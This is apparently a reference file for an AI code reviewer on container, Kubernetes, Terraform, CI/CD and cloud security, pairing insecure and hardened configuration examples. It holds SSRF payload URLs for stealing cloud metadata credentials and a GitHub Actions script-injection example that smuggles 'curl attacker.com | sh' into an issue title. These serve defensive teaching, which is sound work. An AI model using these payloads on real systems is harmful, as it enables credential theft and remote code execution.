# Cloud, Container & Infrastructure Security Reference

> Read this file when analyzing Dockerfiles, docker-compose, Kubernetes YAML, Terraform,
> CI/CD pipelines, or AWS/GCP/Azure configurations.

---

## Docker & Container Security

### Dockerfile Security Checklist

**Critical issues:**

```dockerfile
# ❌ Running as root (default if no USER directive)
FROM ubuntu
RUN apt-get install ...
CMD ["myapp"]

# ✅ Use non-root user
FROM ubuntu
RUN useradd -r -u 1001 -g root appuser
USER 1001
CMD ["myapp"]
```

| Check | Red Flag | Fix |
|---|---|---|
| Root user | No `USER` directive, or `USER root` | Add `USER <non-root-uid>` |
| Latest tag | `FROM ubuntu:latest` | Pin to digest: `FROM ubuntu@sha256:...` |
| Secrets in build | `ENV PASSWORD=secret` or `ARG TOKEN=xxx` | Use secrets mount: `RUN --mount=type=secret,id=token` |
| Privileged container | `--privileged` in run command | Remove; use specific capabilities |
| Docker socket mount | `-v /var/run/docker.sock:/var/run/docker.sock` | Never in production; use Docker-in-Docker alternatives |
| Unnecessary packages | Full OS packages installed | Multi-stage builds; distroless base images |
| SUID/SGID binaries | Not removed | `RUN find / -perm /4000 -type f -exec chmod a-s {} \;` |
| Writable filesystem | No `readOnlyRootFilesystem` | Set in K8s `securityContext` |
| Image provenance | Unknown base image registry | Use trusted registries; verify checksums |

**Multi-stage build to minimize attack surface:**
```dockerfile
# Build stage
FROM golang:1.22 AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o myapp

# Runtime stage — minimal, no build tools
FROM gcr.io/distroless/static-debian12
COPY --from=builder /app/myapp /myapp
USER nonroot:nonroot
ENTRYPOINT ["/myapp"]
```

---

### docker-compose Security Checklist

```yaml
# ❌ Insecure docker-compose
version: "3"
services:
  app:
    image: myapp:latest
    ports:
      - "0.0.0.0:8080:8080"  # Exposed to all interfaces
    environment:
      DB_PASSWORD: mysecretpassword  # Secret in file
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # Dangerous
    privileged: true  # Container escape possible

# ✅ Secure docker-compose
version: "3.8"
services:
  app:
    image: myapp:1.2.3@sha256:abc123  # Pinned version + digest
    ports:
      - "127.0.0.1:8080:8080"  # Localhost only
    environment:
      DB_PASSWORD_FILE: /run/secrets/db_password  # Use secrets
    secrets:
      - db_password
    security_opt:
      - no-new-privileges:true
    read_only: true
    user: "1001:1001"
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE  # Only what's needed

secrets:
  db_password:
    file: ./secrets/db_password.txt  # Not committed to VCS
```

**Red flags to grep in docker-compose files:**
```
privileged: true
/var/run/docker.sock
cap_add: ["SYS_ADMIN"]
network_mode: "host"
environment.*PASSWORD
environment.*SECRET
environment.*TOKEN
environment.*KEY
```

---

## Kubernetes Security

### Pod Security Checklist

```yaml
# ❌ Insecure Pod spec
spec:
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      runAsUser: 0  # Running as root
      privileged: true

# ✅ Secure Pod spec
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:1.2.3
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
      requests:
        cpu: "100m"
        memory: "128Mi"
```

### Kubernetes Red Flags

| Red Flag | Risk | Fix |
|---|---|---|
| `privileged: true` | Container escape to host | Remove; use specific capabilities |
| `hostNetwork: true` | Access to host network | Remove unless required |
| `hostPID: true` | See all host processes | Remove |
| `hostPath` volume | Access to host filesystem | Use PersistentVolumeClaims |
| `automountServiceAccountToken: true` (default) | Credential theft | Set to `false` if not needed |
| No `ResourceLimits` | DoS via resource exhaustion | Add CPU/memory limits |
| No `NetworkPolicy` | Lateral movement | Define ingress/egress policies |
| `RBAC` with `cluster-admin` | Full cluster compromise | Least-privilege roles |
| Secrets as env vars | Exposed in `kubectl describe` | Use Secret volume mounts |
| Image pull from `latest` | Unpredictable deployments | Pin to digest |

### RBAC Least Privilege

```yaml
# ❌ Over-privileged
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# ✅ Minimal privilege
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch"]
```

---

## Terraform / IaC Security

### Common Terraform Red Flags

**AWS S3 — Public Access:**
```hcl
# ❌ Public bucket
resource "aws_s3_bucket_acl" "example" {
  acl = "public-read"  # Exposes all objects
}

# ❌ Missing public access block
# (no aws_s3_bucket_public_access_block = public by default for old buckets)

# ✅ Explicit block
resource "aws_s3_bucket_public_access_block" "example" {
  bucket                  = aws_s3_bucket.example.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

**AWS Security Group — Over-permissive:**
```hcl
# ❌ Open to world
ingress {
  from_port   = 0
  to_port     = 0
  protocol    = "-1"
  cidr_blocks = ["0.0.0.0/0"]  # All traffic from anywhere
}

# ❌ SSH open to world
ingress {
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}
```

**IAM Over-Privilege:**
```hcl
# ❌ Admin policy
resource "aws_iam_policy" "example" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"        # All actions
      Resource = "*"        # All resources
    }]
  })
}

# ✅ Minimal policy
resource "aws_iam_policy" "example" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = ["s3:GetObject", "s3:PutObject"]
      Resource = "arn:aws:s3:::my-specific-bucket/*"
    }]
  })
}
```

**Secrets in Terraform:**
```hcl
# ❌ Secret in plain text
resource "aws_db_instance" "example" {
  password = "mysecretpassword"  # Stored in state file!
}

# ✅ Reference from Secrets Manager
data "aws_secretsmanager_secret_version" "db_pass" {
  secret_id = "prod/db/password"
}
resource "aws_db_instance" "example" {
  password = data.aws_secretsmanager_secret_version.db_pass.secret_string
}
```

### IaC Scanning Tools

| Tool | Supports | Free? | Command |
|---|---|---|---|
| **tfsec** | Terraform | Free | `tfsec .` |
| **Checkov** | Terraform, CloudFormation, K8s, Docker | Free | `checkov -d .` |
| **Trivy** | IaC + containers + code | Free | `trivy config .` |
| **kube-bench** | Kubernetes CIS Benchmark | Free | `kube-bench run` |
| **kube-linter** | K8s manifests | Free | `kube-linter lint .` |
| **Terrascan** | Multi-cloud IaC | Free | `terrascan scan` |

---

## Cloud Metadata Service (SSRF via IMDS)

Cloud provider metadata services return sensitive credentials accessible from within the instance:

| Provider | Metadata URL | What it exposes |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | IAM role credentials, instance ID, security groups |
| AWS (sensitive) | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | `AccessKeyId`, `SecretAccessKey`, `Token` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Service account tokens, project info |
| Azure | `http://169.254.169.254/metadata/instance` | Managed identity tokens |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` | RAM role credentials |

**SSRF payload to test for metadata access:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Mitigations:**
- **AWS:** Enforce IMDSv2 (token-required) — cannot be accessed without a PUT request first
- **GCP:** Disable legacy metadata server; use Workload Identity
- **Network:** Block `169.254.169.254` at the application firewall level
- **Application:** URL allowlist that blocks link-local addresses (`169.254.0.0/16`, `fd00:ec2::254`)

---

## CI/CD Pipeline Security

### GitHub Actions Red Flags

```yaml
# ❌ Dangerous: third-party action at mutable tag
- uses: some-org/some-action@main  # Can be changed anytime

# ✅ Pin to full SHA
- uses: some-org/some-action@a1b2c3d4e5f6...  # Immutable

# ❌ Script injection via issue title
- run: echo "${{ github.event.issue.title }}"
# Attacker creates issue: title="; curl attacker.com | sh; #"

# ✅ Pass via environment variable
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"

# ❌ Over-permissive GITHUB_TOKEN
permissions: write-all

# ✅ Minimal permissions
permissions:
  contents: read
  pull-requests: write
```

### CI/CD Security Checklist

- [ ] Third-party actions pinned to full commit SHA
- [ ] `GITHUB_TOKEN` permissions explicitly set to minimum
- [ ] No secrets printed in logs (`::add-mask::` for dynamic secrets)
- [ ] Pull requests from forks don't have access to secrets
- [ ] Branch protection on `main` — no direct push
- [ ] Code review required before merge
- [ ] OIDC-based cloud auth instead of long-lived access keys
- [ ] Artifact signing (Sigstore/cosign)

---

## Cloud Security Checklist Summary

### AWS
- [ ] S3 buckets: `block_public_access = true`; no public ACLs
- [ ] IAM: no wildcard actions/resources; no inline policies with `*`
- [ ] EC2: IMDSv2 enforced; no public IPs unless required
- [ ] RDS: no public accessibility; encrypted at rest (KMS)
- [ ] Secrets: stored in Secrets Manager or SSM Parameter Store; not in env vars
- [ ] CloudTrail enabled in all regions
- [ ] GuardDuty enabled
- [ ] VPC: security groups follow least privilege; no `0.0.0.0/0` on SSH/RDP
- [ ] KMS CMKs with rotation enabled

### Containers / Kubernetes
- [ ] No containers running as root
- [ ] No privileged containers
- [ ] `readOnlyRootFilesystem: true`
- [ ] `allowPrivilegeEscalation: false`
- [ ] All capabilities dropped; only required ones added
- [ ] Resource limits set (CPU/memory)
- [ ] Network policies defined
- [ ] RBAC uses least-privilege roles
- [ ] Secrets mounted as volumes, not env vars
- [ ] Images pulled from trusted registry; pinned to digest
- [ ] Container images scanned before deployment (Trivy)

---

## References

- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [AWS Security Best Practices](https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Kubernetes Security Docs](https://kubernetes.io/docs/concepts/security/)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
